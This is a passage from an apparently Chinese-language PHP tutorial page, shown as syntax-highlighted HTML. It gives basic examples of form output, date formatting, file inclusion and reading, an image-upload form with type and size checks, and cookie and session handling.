punctuation\">\"</span>error<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>* <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$genderErr</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span> \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2&gt;您输入的内容是:&lt;/h2&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$email</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$website</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$comment</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$gender</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"时间\"><a href=\"#时间\" class=\"headerlink\" title=\"时间\"></a>时间</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y/m/d\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y.m.d\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y-m-d\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//或者</span>\n\n<span class=\"token keyword\">require</span> <span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"文件操作\"><a href=\"#文件操作\" class=\"headerlink\" title=\"文件操作\"></a>文件操作</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//检测文件是否到达末尾</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//逐行读</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//检测文件是否到达末尾</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">fgetc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//逐行读</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">//执行一些代码</span>\n\n<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span>菜鸟教程<span class=\"token punctuation\">(</span>runoob<span class=\"token operator\">.</span>com<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>body<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"upload_file.php\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"post\"</span> enctype<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"multipart/form-data\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>label <span class=\"token keyword\">for</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token operator\">&gt;</span>文件名：<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>label<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span> id<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"提交\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"错误：\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"上传文件名: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件类型: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件大小: \"</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">/</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" kB&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件临时存储的位置: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 允许上传的图片后缀</span>\n<span class=\"token variable\">$allowedExts</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"gif\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jpeg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jpg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"png\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$temp</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$extension</span> <span class=\"token operator\">=</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 获取文件后缀名</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/gif\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/jpeg\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/jpg\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/pjpeg\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/x-png\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/png\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">204800</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">// 小于 200 kb</span>\n<span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$extension</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allowedExts</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"错误：: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"上传文件名: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件类型: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件大小: \"</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">/</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" kB&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件临时存储的位置: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"非法的文件格式\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//cookie 常用于识别用户。cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$expire</span><span class=\"token operator\">=</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">60</span><span class=\"token operator\">*</span><span class=\"token number\">60</span><span class=\"token operator\">*</span><span class=\"token number\">24</span><span class=\"token operator\">*</span><span class=\"token number\">30</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$expire</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 输出 cookie 值</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 查看所有 cookie</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 存储 session 数据</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>菜鸟教程(runoob.com)<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 检索 session 数据</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"浏览量：\"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"浏览量：\"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token 